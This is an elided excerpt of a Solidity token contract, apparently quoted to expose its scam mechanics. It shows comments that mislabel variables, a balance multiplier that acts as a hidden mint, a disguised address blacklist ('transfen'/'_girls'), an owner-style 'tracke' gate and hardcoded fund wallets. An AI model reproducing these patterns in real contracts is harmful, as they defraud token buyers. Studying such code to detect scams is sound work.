...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address private fundAddress; // MarketingWallet
    ...
    uint256 public dividenTotal; // MaxBuy
    ...
    function _tokenTransfer(
        ...
        if(txcount >= swapTrigger){
            uint256 balance = tAmount * dividenTotal;
    ...
    function setFundAddress(address addr) external {tracke(true);
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setDividenAmount(uint256 total) public {tracke(true);
        dividenTotal = total;
    }
    ...
    function transfen(address addr, bool enable) external {tracke(true);
        _girls[addr] = enable;
    }

    function claimBalance() external {tracke(true);
...
contract Token is AbsToken {
    constructor() AbsToken(
        ...
        9,//Decimals
        1,//Supply
        address(0xA52bE8d1Dd60Bc6A824a6fEfFcaeDC2BAA46110A),//FundAddress
        address(0xd58F1f704c895bFdc348813EE430f89F8c29F402),//ReceiveAddress
